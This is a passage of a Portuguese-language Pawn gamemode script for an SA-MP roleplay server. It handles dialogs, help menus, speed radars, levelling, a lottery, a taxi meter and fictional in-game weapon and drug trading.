			   	format(gstring, sizeof(gstring), "\n\n{FF0000}O(A) jogador(a) está muito longe!\n\nArma {FF7F00}%s\n\n{FFFFFF}Digite o ID do(a) jogador(a) próximo dele(a):", ArmaNome(armaEscol[playerid]));
          		ShowPlayerDialog(playerid, D_PARMA+2, DIALOG_STYLE_INPUT, "{FFFFFF}Tráfico de Armas", gstring, "Oferecer", "Cancelar");
				return 0;
			}
   			if(pInfo[id][fardado] == 1)
   			{
			    SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) é um(a) policial e está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você não pode vender armas para um(a) policial fardado(a)!");
			    return 1;
			}
          	if(GetPlayerCash(id) < preccArma[playerid] || GetPlayerCash(id) <= 0)
			{
			    format(gStr, sizeof(gStr), "%s não tem dinheiro suficiente para comprar está arma!", PlayerName(id));
			    SendClientMessage(playerid, COR_ERRO, gStr);
			  	return 1;
			}
			compraArm[playerid] = id;
			compraArm[id] = playerid;
			preccArma[id] = preccArma[playerid];
			armaEscol[id] = armaEscol[playerid];
			showTextA@R(id);
			temptemp_[id] = 15;
			timerarms[id] = SetTimerEx("tempomsgt", 1000, false, "d", id);
			format(gStr, 128, "Arma oferecida para %s, aguarde entre 15 segundos a resposta.", PlayerName(id));
			SendClientMessage(playerid, COR_AMARELO, gStr);
		}
		if(!response)
		{
		    armaEscol[playerid] = -1;
		    compraArm[playerid] = -1;
		    preccArma[playerid] = -1;
		}
	}
	if(dialogid == 6540)
	{
		if(response)
		{
		    SpawnProf(playerid);
		}
	}
	if(dialogid == 6541)
	{
		if(response)
		{
		    SpawnProf(playerid);
		}
	}
	if(dialogid == 6542)
	{
		if(response)
		{
		    SpawnProf(playerid);
		}
	}
	if(dialogid == 6543)
	{
		if(response)
		{
		    SpawnProf(playerid);
		}
	}
	if(dialogid == 6544)
	{
		if(response)
		{
		    SpawnProf(playerid);
		}
	}
	if(dialogid == D_CELLL)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
		        // Créditos SMS
		        format(gStr, 128, "{FFFFFF} Seu celular tem {CAFFAB}%d créditos de SMS", pInfo[playerid][Celular_c]);
		        ShowPlayerDialog(playerid, D_CELLL+1, DIALOG_STYLE_MSGBOX, "Créditos", gStr, "OK", "");
		    }
		    if(listitem == 1)
		    {
		        // Enviar SMS
		        ShowPlayerDialog(playerid, D_CELLL+1, DIALOG_STYLE_MSGBOX, "Envio de SMS", "{FFFFFF} Para enviar um SMS use o comando:\n\t/SMS [ID do(a) jogador(a)] [Mesagem]", "OK", "");
			}
		}
	}
	if(dialogid == D_AJUDA)
	{
		if(response)
		{
			new
				stg[1500]
			;
		    if(listitem == 0) // Servidor
			{
				strcat(stg, "\t{FFFF00}{1E90FF}World {FF1E1E}Evolution {FFFF00}RPG\n");
                strcat(stg, "\n{FFFFFF} O modo de jogo do nosso servidor é RPG (RolePlayGame)");
                strcat(stg, "\n{FFFFFF} Neste modo, você simulará a sua vida na virtualidade, mas não ao pé da letra;");
                strcat(stg, "\n{FFFFFF} Mesmo sendo uma simulação, não deixa de ser um jogo, sendo assim, você irá viver a essência do jogo.");
                strcat(stg, "\n{FFFFFF} Você poderá trabalhar, adquirir propriedades residênciais e empresariais, dentre vários outros itens;");
                strcat(stg, "\n{FFFFFF} Poderá também criar e liderar uma organização, comprar veículos, tornar-se VIP, e várias outras coisas.");
                strcat(stg, "\n{FFFFFF} Assim como na realidade, irá encontrar vários locais de acesso público, como prefeitura, hospital, banco, e outros.");
                strcat(stg, "\n{FFFFFF} O homicídio é controlado, somente as profissões desonestas podem assassinar em qualquer local;.");
                strcat(stg, "\n{FFFFFF} Caso você esteja exercendo uma profissão não-desonesta, será preso automaticamente ao matar fora dos locais permitidos;");
                strcat(stg, "\n{FFFFFF} As áreas onde o homicídio é livre para qualquer jogador(a), são as GangZones e a favela.");
                strcat(stg, "\n{FFFFFF} Teremos em vários momentos, eventos de corrida, caça, e DeathMatch (Mata-Mata), criado por administradores.");
                strcat(stg, "\n{FFFFFF} Espero que tenha sido uma explicação útil a você. Quanto mais jogar, mais descobrirá sobre.");
				strcat(stg, "\n{FFFFFF} A equipe {1E90FF}W{FF1E1E}E {FFFFFF}lhe deseja um ótimo jogo!");
				ShowPlayerDialog(playerid, D_AJUDA+1, DIALOG_STYLE_MSGBOX, "{FF1E1E} {1E90FF}Servidor - World Evolution RPG", stg, "OK", "");
		    }
		    if(listitem == 1) // Créditos
		    {
				strcat(stg, "\t{FFFF00} Créditos do Servidor\n");
            	strcat(stg, "\n{FFFFFF} Programadores: Learning, Rey_Mysterio, Axll & Cleyton");
            	strcat(stg, "\n{FFFFFF} Beta testers e auxiliares:");
            	strcat(stg, "\n{FFFFFF}  Learning, Rey_Mysterio, Axll, Eddie & Cleyton\n");
            	strcat(stg, "\n{FFFFFF} E créditos principalmente a você, jogador(a).");
				strcat(stg, "\n\n{FFFF00} World Evolution RPG 1.0, um servidor {FFA600}Viva Games Online{FFFF00}!");
				ShowPlayerDialog(playerid, D_AJUDA+1, DIALOG_STYLE_MSGBOX, "{FF1E1E} {1E90FF}Créditos - World Evolution RPG", stg, "OK", "");
		    }
		    if(listitem == 2) // Administração e Moderação
			{
				strcat(stg, "{FFFFFF}Administração e Moderação - {1E90FF}Equipe {FF1E1E}WE\n");
                strcat(stg, "\n{FFFFFF} Equipe Viva {FF1E1E}World {1E90FF}Evolution:");
                strcat(stg, "\n{FFFFFF} A {FF1E1E}World {1E90FF}Evolution {FFF000}Games{FFFFFF} conta com uma equipe completa;");
                strcat(stg, "\n{FFFFFF}Somos todos unidos e dispostos a transformar sua jogabilidade na melhor possível,");
                strcat(stg, "\n{FFFFFF}sempre que estiver precisando de auxilio ou compania, nossa equipe estará a sua disposição!");
                strcat(stg, "\n\t{FFFFFF}Atenciosamente, equipe {FFA600}Viva{FF1E1E}W{1E90FF}E.");
                ShowPlayerDialog(playerid, D_AJUDA+1, DIALOG_STYLE_MSGBOX, "{FF1E1E} {1E90FF}Staff - World Evolution RPG", stg, "OK", "");
			}
		    if(listitem == 3) // Regras
		    {
		        format(gstring, sizeof(gstring), "{1E90FF} Jamais cometa DM (Homicídio sem motivo) em locais públicos e interiores,");
	        	strcat(stg, gstring);
	        	format(gstring, sizeof(gstring), "\n{1E90FF}sendo eles: Agências de empregos, bancos, prefeituras, hospitais, spawn de profissões, dentre outros.");
	        	strcat(stg, gstring);
		        format(gstring, sizeof(gstring), "\n\n{FF1E1E} Drive-by (atirar de um veículo contra um(a) jogador(a) apé) é proibido, sendo assim");
        		strcat(stg, gstring);
        		format(gstring, sizeof(gstring), "\n{FF1E1E}aquele que cometer a infração citada será devidamente punido. (OBS. Atirar de veículo contra veículo é permitido)");
	        	strcat(stg, gstring);
	        	format(gstring, sizeof(gstring), "\n\n{1E90FF} O insulto, desrespeito e racismo é proibido e totalmente intolerável, sempre procure respeitar e aceitar.");
	        	strcat(stg, gstring);
        		format(gstring, sizeof(gstring), "\n\n{FF1E1E} Não peça um cargo na Equipe {1E90FF}WE{FF1E1E}, quanto mais insistir, menos será sua chance de conseguir uma vaga,");
        		strcat(stg, gstring);
	        	format(gstring, sizeof(gstring), "\n{FF1E1E}caso queira fazer parte da mesma, seja honesto(a), humilde, ajude os outros jogadores e procure manter a ordem.");
        		strcat(stg, gstring);
        		format(gstring, sizeof(gstring), "\n\n{1E90FF} O uso de cheater e programas que lhe dê vantagens é totalmente proibido, sujeito a banimento permanente.");
	        	strcat(stg, gstring);
				ShowPlayerDialog(playerid, 1448, DIALOG_STYLE_MSGBOX, "{FF1E1E} {1E90FF}Regras Gerais - World Evolution RPG", stg, "OK", "Avançar");
		    }
		    if(listitem == 4) // Comandos
		    {
    			format(gStr, sizeof(gStr), "{1E90FF}/Ajuda\n/192\n/MeuNivel\n/RG\n/Profissao\n/GPS\n/Tutorial");
	    		strcat(stg, gStr);
	    		format(gStr, sizeof(gStr), "{1E90FF}\n/Admins ou /Mods\n/Creditos\n/Ausentes\n/Transferir");
	    		strcat(stg, gStr);
	    		format(gStr, sizeof(gStr), "{1E90FF}\n/Veiculo Trancar\n/Veiculo Destrancar");
	    		strcat(stg, gStr);
	    		format(gStr, sizeof(gStr), "{1E90FF}\n/Duvida - {FF1E1E}Use caso tenha uma dúvida.");
	    		strcat(stg, gStr);
	    		format(gStr, sizeof(gStr), "{1E90FF}\n/Reportar - {FF1E1E}Use em caso de bugs, ou cheaters.");
	    		strcat(stg, gStr);
            	ShowPlayerDialog(playerid, 1448, DIALOG_STYLE_MSGBOX, "{FF1E1E} {1E90FF}Comandos - World Evolution RPG", stg, "Fechar", "");
		    }
		    if(listitem == 5) // Level
		    {
		        SendClientMessage(playerid, VERMELHO_WE, "Menu ainda não desenvolvido, aguarde.");
		    }
		    if(listitem == 6) // Basquete
			{
				strcat(stg, "{FFF000}Como jogar basquete:\n");
                strcat(stg, "\n{1E90FF}Para trazer a bola, use: {FFFFFF}'/Bola'");
                strcat(stg, "\n{1E90FF}Para pegar a bola, clique com o {FFFFFF}'Botão direito' {1E90FF}(LMB - KEY_FIRE).");
                strcat(stg, "\n{1E90FF}Para arremessar a bola, clique com o {FFFFFF}'Botão direito' {1E90FF}novamente.");
                strcat(stg, "\n{1E90FF}Para permanecer parado com a bola, use {FFFFFF}'C' {1E90FF}(KEY_CROUCH)");
                strcat(stg, "\n{1E90FF}Para correr com a bola, use {FFFFFF}'Espaço' {1E90FF}(KEY_SPRINT)");
                strcat(stg, "\n{1E90FF}Para passar a bola para alguém, use {FFFFFF}'C' + {FFFFFF}'Botão direito' {1E90FF}(KEY_CROUCH + KEY_FIRE)");
                ShowPlayerDialog(playerid, D_AJUDA+1, DIALOG_STYLE_MSGBOX, "{FF1E1E} {1E90FF}Basquete - World Evolution RPG", stg, "OK", "");
			}
		    if(listitem == 7) // Eventos
		    {
		        SendClientMessage(playerid, VERMELHO_WE, "Menu ainda não desenvolvido, aguarde.");
		    }
		    if(listitem == 8) // Lugares
		    {
		        SendClientMessage(playerid, VERMELHO_WE, "Menu ainda não desenvolvido, aguarde.");
		    }
		}
	}
	return false; //OnDialogResponse
}

public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	if(_:clickedid == INVALID_TEXT_DRAW)
	{
		if(NoTuto[playerid] == true) return 1;
	}
	return true;
}

//----------------------------- FomeSedeSono -----------------------------------
forward Corrigir(playerid);
public Corrigir(playerid)
{
	if(GetPVarInt(playerid,"Sede") > 100)
	{

		SetPVarInt(playerid,"Sede", 100);
		SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
	}
	if(GetPVarInt(playerid,"Fome") > 100)
	{

		SetPVarInt(playerid,"Fome", 100);
		SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
	}
	return false;
}
//--------------------------------- FSS ----------------------------------------

forward traficAReset(playerid, id);
public traficAReset(playerid, id)
{
    if(compraArm[playerid] >= 0)
    {
        if(IsPlayerConnected(playerid) && IsPlayerConnected(id))
        {
            format(gStr, 128, "%s demorou para responder e a oferta foi cancelada!", PlayerName(id));
			SendClientMessage(playerid, COR_ERRO, gStr);
			format(gStr, 128, "Você demorou para responder a oferta feita por %s a mesma foi cancelada!", PlayerName(playerid));
			SendClientMessage(id, COR_ERRO, gStr);
        }
        else if(!IsPlayerConnected(playerid) && IsPlayerConnected(id))
        {
			SendClientMessage(id, COR_ERRO, "Você demorou para responder a oferta feita por um(a) traficante de armas!");
        }
        else if(IsPlayerConnected(playerid) && !IsPlayerConnected(id))
        {
			SendClientMessage(id, COR_ERRO, "O(A) cliente que você ofereceu armas desconectou-se e demorou para responder!");
        }
        compraArm[playerid] = 0;
		armaEscol[playerid] = 0;
		compraArm[id] = 0;
		armaEscol[id] = 0;
    }
	return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
	{
	    if(NoTuto[clickedplayerid] == true)
	    {
			SendClientMessage(playerid, COR_ERRO, "Esse jogador está vendo o tutorial.");
			return 1;
	    }
		TogglePlayerSpectating(playerid, 1);
		if(!IsPlayerInAnyVehicle(clickedplayerid)) PlayerSpectatePlayer(playerid, clickedplayerid);
		else PlayerSpectateVehicle(playerid, GetPlayerVehicleID(clickedplayerid), SPECTATE_MODE_NORMAL);
		SetPlayerInterior(playerid, GetPlayerInterior(clickedplayerid));
		SpectateType[playerid] = ADMIN_SPEC_TYPE_PLAYER;
		SpectateID[playerid] = clickedplayerid;
		format(gStr, sizeof(gStr), "Você está espiando o(a) jogador(a) %s para parar de espiar: /EspiarOff", PlayerName(clickedplayerid));
		SendClientMessage(playerid, 0x1E90FFAA, gStr);
	}
	return 1;
}

stock GetPlayerSpeed(playerid, bool:kmh = true)
{
	new
		Float:xx,
		Float:yy,
		Float:zz,
		Float:pSpeed;

	if(IsPlayerInAnyVehicle(playerid))
	{
		GetVehicleVelocity(GetPlayerVehicleID(playerid), xx, yy, zz);
	}
	else
	{
		GetPlayerVelocity(playerid, xx, yy, zz);
	}
	pSpeed = floatsqroot((xx * xx) + (yy * yy) + (zz * zz));
	return kmh ? floatround((pSpeed * 165.12)) : floatround((pSpeed * 103.9));
}

public OnPlayerUpdate(playerid)
{
	//AntiVehicle
	new vehicleID = GetPlayerVehicleID(playerid);
    if(lastVehicle[playerid] != vehicleID)
    {
        lastVehicle[playerid] = vehicleID;
        if(GetVehicleModel(vehicleID))
        {
            CallRemoteFunction("OnPlayerChangeVehicle","ii", playerid, vehicleID);
        }
    }//
    if(Roubando[playerid] == true)
    {
        if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1767.4434,-1699.8270,13.5096))
        {
            KillTimer(FimAssalto[playerid]);
            KillTimer(AnimRoubo[playerid]);
            ClearAnimations(playerid);
            SendClientMessage(playerid, COR_ERRO, "Você saiu do local e não concluiu o roubo!");
            ProxRoubo[playerid] = SetTimerEx("ProxAssalto", 1500000, false, "i", playerid);
            Roubando[playerid] = false;
		}
		else if(Algemado[playerid] == 1)
  		{
            KillTimer(FimAssalto[playerid]);
            KillTimer(AnimRoubo[playerid]);
            ClearAnimations(playerid);
            SendClientMessage(playerid, COR_ERRO, "Você foi algemado e não concluiu o roubo!");
            ProxRoubo[playerid] = SetTimerEx("ProxAssalto", 1500000, false, "i", playerid);
            Roubando[playerid] = false;
		}
	}
	return 1;
}

forward CheckPlayerInRadar();
public CheckPlayerInRadar()
{
    SetTimer("CheckPlayerInRadar", 100, false);

	foreach(Player, i)
	{
	    new
			vehicleid = GetPlayerVehicleID(i)
		;
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			new
				vehicleidModel = GetVehicleModel(vehicleid),
				vStr[10],
				lStr[20],
				mStr[100],
				hStr[100],
				zone[MAX_ZONE_NAME]
			;
			if(vehicleidModel == 481 || vehicleidModel == 509 || vehicleidModel == 510)
	    	{
	      		TextDrawSetString(Velocimetro3[i], "~r~~h~N/A Litros");
	    	}
	    	else
			{
				format(lStr, sizeof(lStr), "%d Litros", pInfo[i][Gas]);
				TextDrawSetString(Velocimetro3[i], lStr);
			}//VeiculoV
			format(vStr, sizeof(vStr), "%i", GetPlayerSpeed(i, true));
			TextDrawSetString(Velocimetro0[i], vStr);
			GetPlayer2DZone(i, zone, MAX_ZONE_NAME);
			format(mStr, sizeof(mStr), "%s", vNome[GetVehicleModel(vehicleid)-400]);
			TextDrawSetString(Velocimetro7[i], mStr);
			format(hStr, sizeof(hStr), "%s", zone);//18 a mais.
			TextDrawSetString(Velocimetro4[i], hStr);
		}
	    if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
	    {
	        for(new e = 0; e < sizeof(SpikeInfo); e++)
	  	    {
	  	        if(IsPlayerInRangeOfPoint(i, 3.0, SpikeInfo[e][sX], SpikeInfo[e][sY], SpikeInfo[e][sZ]))
	            {
	  	            if(SpikeInfo[e][sCreated] == 1)
	  	            {
	  	                new
						  	panels, doors, lights, tires
			  			;
	  	                if(vehicleid != 597 || vehicleid != 599 || vehicleid != 523 || vehicleid != 497 || vehicleid != 598 || vehicleid != 596)
			  			{
     				 		GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
					       	tires = encode_tires(1, 1, 1, 1);
					     	UpdateVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
						}
	  	            }
	  	        }
	  	    }
	  	}
		CheckInRadar(i, 1700.77087, 414.56015, 30.00000, 20.0, 120); // 1
		CheckInRadar(i, -1220.04248, -769.33087, 63.70000, 20.0, 120); // 2
		CheckInRadar(i, -143.34355, -1318.30847, 1.40000, 20.0, 120); // 3
		CheckInRadar(i, 660.9880,666.7653, 6.60294, 20.0, 120); // 4
		CheckInRadar(i, -1637.78394, 2013.41296, 17.66738, 20.0, 120); // 5
		CheckInRadar(i, -2681.42578, 1956.42688, 62.27490, 20.0, 120); // 6
		CheckInRadar(i, -1772.58240, -1441.72498, 34.25580, 20.0, 120); // 7
		CheckInRadar(i, -1065.33606, -2857.72314, 66.69350, 20.0, 120); // 8
		CheckInRadar(i, 2760.43213, -102.90350, 34.08050, 20.0, 120); // 9
	}
	return 1;
}

stock CheckInRadar(playerid, Float:xx, Float:yy, Float:zz, Float:radius, speed)
{
	if(IsPlayerInRangeOfPoint(playerid, radius, xx, yy, zz))
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && PassouRadar[playerid] == 0)
		{
    		new
				t_speedY = GetPlayerSpeed(playerid, true)
			;
			if(t_speedY > speed && aInfo[playerid][Admin] == 0)
			{
				    if(PassouRadar[playerid] == 0)
				    {
						SendClientMessage(playerid, VERMELHO_WE, "{1E90FF}[Polícia Rodoviária] {FF1E1E}Multado(a) por excesso de velocidade!");
						format(gstring, sizeof(gstring), " %s, você excedeu o limite de velocidade. Informações da infração:", PlayerName(playerid));
	                    SendClientMessage(playerid, COR_BRANCO, gstring);
	                    format(gstring, sizeof(gstring), " Velocidade máxima permitida: {FF0000}%d KM/H{FFFFFF}.", speed);
	                    SendClientMessage(playerid, COR_BRANCO, gstring);
						format(gstring, sizeof(gstring), " Velocidade detectada: {FF0000}%d KM/H{FFFFFF}.", t_speedY);
	                    SendClientMessage(playerid, COR_BRANCO, gstring);
						format(gstring, sizeof(gstring), " Multado(a) em {00DD00}R$ %d{FFFFFF} reais.", t_speedY * 2);
	                    SendClientMessage(playerid, COR_BRANCO, gstring);
	                    TextDrawShowForPlayer(playerid, Flash);
				        GameTextForPlayer(playerid, "~r~MULTADO", 2000, 5);
      					SetTimerEx("LiberarRadar", 5000, false, "d", playerid);
						SetTimerEx("FlashFotoSair", 1500, false, "d", playerid);
						sGivePlayerCash(playerid, -t_speedY*2);
						PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
						PassouRadar[playerid] = 1;
					}
			}
			else if(t_speedY < speed)
			{
					if(PassouRadar[playerid] == 0)
					{
					  	GameTextForPlayer(playerid, "~w~RADAR", 2000, 5);
						format(gstring, sizeof(gstring), "Velocidade detectada: {00FF00}%d KM/H{FFFFFF}.", t_speedY);
					    SendClientMessage(playerid, 0xFFFFFFFF, gstring);
						format(gstring, sizeof(gstring), "Velocidade máxima permitida: {FF0000}%d KM/H{FFFFFF}.", speed);
						SendClientMessage(playerid, 0xFFFFFFFF, gstring);
						SetTimerEx("LiberarRadar", 5000, false, "d", playerid);
						PassouRadar[playerid] = 1;
						PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
					}
			}
		}
	}
}

forward LiberarRadar(playerid);
public LiberarRadar(playerid)
{
	PassouRadar[playerid] = 0;
	return 1;
}

stock GetWeaponModel(weaponid)
{
	switch(weaponid)
	{
	    case 1:
	        return 331;
		case 2..8:
		    return weaponid+331;
        case 9:
		    return 341;
		case 10..15:
			return weaponid+311;
		case 16..18:
		    return weaponid+326;
		case 22..29:
		    return weaponid+324;
		case 30,31:
		    return weaponid+325;
		case 32:
		    return 372;
		case 33..45:
		    return weaponid+324;
		case 46:
		    return 371;
	}
	return 0;
}

forward CheckComandos(playerid);
public CheckComandos(playerid)
{
	if(Carregou[playerid] == 1)
	{
		Carregou[playerid] = 0;
		SendClientMessage(playerid, AZUL_WE, "A empresa de carregamento já tem outro pedido de entrega disponível!");
	}
	return 1;
}

forward ComandoVoltar(playerid);
public ComandoVoltar(playerid)
{
	if(pInfo[playerid][Continuar] == true)
	{
	    SendClientMessage(playerid, VERMELHO_WE, "O seu tempo para usar o comando '/Voltar', expirou!");
	    pInfo[playerid][Continuar] = false;
	}
    if(Teleporte[playerid] == 1)
    {
        SendClientMessage(playerid, AZUL_WE, "Você é um(a) jogador(a) VIP, seu tempo para realizar um teleporte expirou!");
        Teleporte[playerid] = 0;
    }
	return 1;
}

forward UPLevel(playerid);
public UPLevel(playerid)
{
	if(IsPlayerConnected(playerid) && pInfo[playerid][Logado] == true)
	{
		if(pInfo[playerid][AFK] == false)
		{
			format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));

			if(pInfo[playerid][Exp] >= 5)
			{
				pInfo[playerid][Exp] = 0;
				pInfo[playerid][Level] ++;
				SendClientMessage(playerid, COR_BRANCO, "{FFFB00}({009933}+{FFFB00}UP){FFFFFF} Você acumulou {FFFB00}5{FFFFFF} pontos de experiência e upou {009933}+{FFFB00}1 nível{FFFFFF}.");
				format(gStr, sizeof(gStr), "Nível atual: {FFFB00}%d{FFFFFF}.", pInfo[playerid][Level]);
				SendClientMessage(playerid, COR_BRANCO, gStr);
				GameTextForPlayer(playerid, "~g~~h~+~y~Nivel", 3000, 6);
				WE_SetInt(gFile, "Exp", pInfo[playerid][Exp]);
				WE_SetInt(gFile, "Level", pInfo[playerid][Level]);
				SetPlayerScore(playerid, WE_GetInt(gFile, "Level"));
				SetTimerEx("PagarSalario", 30000, false, "d", playerid);
				if(pInfo[playerid][Level] == 1)
				{
				    GivePlayerCash(playerid, 10000);
				    SendClientMessage(playerid, AZUL_WE, "{FFFB00}({009933}+{FFFB00}UP){FFFFFF} Você recebeu {009933}R$10.000 {FFFFFF}reais por completar 1 nível.");
				}
				if(pInfo[playerid][Level] == 5)
				{
				    GivePlayerCash(playerid, 10000);
				    SendClientMessage(playerid, AZUL_WE, "{FFFB00}({009933}+{FFFB00}UP){FFFFFF} Você recebeu {009933}R$10.000 {FFFFFF}reais por completar 5 níveis.");
				}
				if(pInfo[playerid][Level] == 10)
				{
				    GivePlayerCash(playerid, 10000);
				    SendClientMessage(playerid, AZUL_WE, "{FFFB00}({009933}+{FFFB00}UP){FFFFFF} Você recebeu {009933}R$10.000 {FFFFFF}reais por completar 10 níveis.");
				}
			}
			else
			{
				format(gStr, sizeof(gStr), "{FFFB00}({009933}+{FFFB00}EXP){FFFFFF} Você recebeu 1 ponto de experiência por permanecer online. {FFFB00}(Acumulando: %d/6)", pInfo[playerid][Exp]+1);
				SendClientMessage(playerid, COR_BRANCO, gStr);
				GameTextForPlayer(playerid, "~g~~h~+~y~EXP", 3000, 6);
				pInfo[playerid][Exp] ++;
				WE_SetInt(gFile, "Exp", pInfo[playerid][Exp]);
			}
		}
		else
		{
			SendClientMessage(playerid, VERMELHO_WE, "Você não upou por estar ausente (AFK).");
		}
		return 1;
	}
	return 1;
}

forward SortearLoteria();
public SortearLoteria()
{
	new
		NumeroLoto = random(60)
	;
	new
		Premio = random(50000) + 1000
	;
	if(NumeroLoto < 0)
	{
		NumeroLoto = -(NumeroLoto + 1);
  	}
  	if(Premio < 0)
 	{
		Premio = -(Premio + 1000);
  	}
  	format(gstring, sizeof(gstring), "%i", NumeroLoto);

	if(strcmp(WE_GetString("Loteria.ini", gstring), "1", true) == 0)
	{
		foreach(Player, i)
		{
			format(s5Doze, sizeof(s5Doze), "~g~~h~Loterias ~r~~h~W~b~~h~E~n~~b~~h~Vencedor(a): ~w~~h~Nenhum~n~~w~~h~Numero Sorteado: ~b~%d~n~~w~~h~Premio sorteado: ~g~R$~w~~h~%d~n~~w~Total Acumulado: ~g~R$~w~~h~%d", NumeroLoto, Premio, WE_GetInt("Acumulado.ini", "Acumulado"), WE_GetInt("Acumulado.ini", "Acumulado") + Premio);
			TextDrawSetString(TextLoteria, s5Doze);
			TextDrawShowForPlayer(i, TextLoteria);
			SetTimer("OcultarLoteria", 10000, false);
		}
		WE_SetInt("Acumulado.ini", "Acumulado", WE_GetInt("Acumulado.ini", "Acumulado") + Premio);
		LimparLoteria();
 		return 1;
  	}
 	else if(strcmp(WE_GetString("Loteria.ini", gstring), "1", false))
	{
		foreach(Player, i)
		{
			format(s5Doze, sizeof(s5Doze), "~g~~h~Loterias ~r~~h~W~b~~h~E~n~~b~~h~Vencedor(a): ~w~~h~%s~n~~w~~h~Numero Sorteado: ~b~%d~n~~w~Premio total: ~g~R$~w~~h~%d", WE_GetString("Loteria.ini", gstring), NumeroLoto, WE_GetInt("Acumulado.ini", "Acumulado") + Premio);
			TextDrawSetString(TextLoteria, s5Doze);
			TextDrawShowForPlayer(i, TextLoteria);
			SetTimer("OcultarLoteria", 10000, false);
			format(gFile, sizeof(gFile), "Contas/%s.ini", WE_GetString("Loteria.ini", gstring));
			if(strcmp(PlayerName(i), WE_GetString("Loteria.ini", gstring), true) == 0)
			{
				if(WE_GetInt("Acumulado.ini", "Acumulado") != 0)
				{
					sGivePlayerCash(i, WE_GetInt("Acumulado.ini", "Acumulado") + Premio);
				}
				else if(WE_GetInt("Acumulado.ini", "Acumulado") == 0)
				{
	            	sGivePlayerCash(i, Premio);
				}
			}
		}
		format(gStr, sizeof(gStr), "* Sortudo: %s - N°: %d - Prêmio: %d - Acumulado: %d -  Prêmio Total: %d", WE_GetString("Loteria.ini", gstring), NumeroLoto, Premio, WE_GetInt("Acumulado.ini", "Acumulado"), WE_GetInt("Acumulado.ini", "Acumulado") + Premio);
		printf("Sortudo: %s - N°: %d - Prêmio: %d - Acumulado: %d -  Prêmio Total: %d", WE_GetString("Loteria.ini", gstring), NumeroLoto, Premio, WE_GetInt("Acumulado.ini", "Acumulado"), WE_GetInt("Acumulado.ini", "Acumulado") + Premio);
        LotoGanhadores(gStr);
		LimparLoteria();
		WE_SetInt("Acumulado.ini", "Acumulado", 0);
		return 1;
	}
	return 1;
}

forward OcultarLoteria();
public OcultarLoteria()
{
    TextDrawHideForAll(TextLoteria);
	return 1;
}

forward RodarTaximetro(playerid);
public RodarTaximetro(playerid)
{
	if(Taximetro[playerid][1] == 1)
    {
    	if(GetPlayerCash(playerid) > PrecoTaximetro[playerid] + 5)
     	{
     	    if(Taxi_Bandeira == 1)
     	    {
     	        SendClientMessage(playerid, COR_BRANCO, "Bandeira 1 - {FFFF00}Você paga +R$10!");
     	        SendClientMessage(Taximetro[playerid][2], COR_BRANCO, "Bandeira 1 - {FFFF00}Você ganha +R$10!");
      			PrecoTaximetro[playerid] += 10;
			}
			else if(Taxi_Bandeira == 2)
     	    {
     	        SendClientMessage(playerid, COR_BRANCO, "Bandeira 2 - {FFFF00}Você paga +R$20!");
     	        SendClientMessage(Taximetro[playerid][2], COR_BRANCO, "Bandeira 2 - {FFFF00}Você ganha +R$20!");
      			PrecoTaximetro[playerid] += 10;
			}
   			format(gStr, sizeof(gStr), "~n~~n~~n~Taximetro~n~Total a pagar: ~g~R$%d~n~Tarifa: ~w~%d", PrecoTaximetro[playerid] + 20, Taxi_Bandeira);
            GameTextForPlayer(playerid, gStr, 3000, 5);
			GameTextForPlayer(Taximetro[playerid][2], gStr, 3000, 5);
		}
		else if(GetPlayerCash(playerid) < PrecoTaximetro[playerid] + 5)
		{
		    KillTimer(T_Taximetro[playerid]);
			SendClientMessage(playerid, COR_ERRO, "Seu dinheiro acabou portando você não tem condições de pagar mais um táxi e ficará neste local!");
            SendClientMessage(Taximetro[playerid][2], COR_ERRO, "O dinheiro de seu passageiro acabou!");
			sGivePlayerCash(playerid, -PrecoTaximetro[playerid]);
            sGivePlayerCash(Taximetro[playerid][2], PrecoTaximetro[playerid] + 20);
            RemovePlayerFromVehicle(playerid);
			Taxista_P[Taximetro[playerid][2]] = 0;
			Taximetro[playerid][1] = 0;
			PrecoTaximetro[playerid] = 0;
			Taximetro[playerid][2] = 0;
        }
        return 1;
    }
	return 1;
}

forward AceitarCocaina(playerid);
public AceitarCocaina(playerid)
{
	if(AceitarCoca[playerid] == 1)
	{
		KillTimer(T_Drogas[playerid]);
		T_Drogas[playerid] = SetTimerEx("AceitarCocaina", 3000, true, "i", playerid);
 		format(gStr, sizeof(gStr), " %s está oferecendo para você %d pinos de farinha por R$%d. (/AceitarCocaina | /RecusarCocaina)", PlayerName(playerid), QuantiaCoca[playerid], ValorCoca[playerid]);
	    SendClientMessage(playerid, COR_AMARELOCLARO, gStr);
	    AceitarCoca[playerid] = 2;
	    return 1;
	}
	if(AceitarCoca[playerid] == 2)
	{
	    format(gStr, sizeof(gStr), " %s está oferecendo para você %d pinos de farinha por R$%d. (/AceitarCocaina | /RecusarCocaina)", PlayerName(playerid), QuantiaCoca[playerid], ValorCoca[playerid]);
	    SendClientMessage(playerid, COR_AMARELOCLARO, gStr);
		AceitarCoca[playerid] = 3;
	    return 1;
	}
	if(AceitarCoca[playerid] == 3)
	{
	    format(gStr, sizeof(gStr), " %s está oferecendo para você %d pinos de farinha por R$%d. (/AceitarCocaina | /RecusarCocaina)", PlayerName(playerid), QuantiaCoca[playerid], ValorCoca[playerid]);
	    SendClientMessage(playerid, COR_AMARELOCLARO, gStr);
	    AceitarCoca[playerid] = 4;
	    return 1;
	}
	if(AceitarCoca[playerid] == 4)
	{
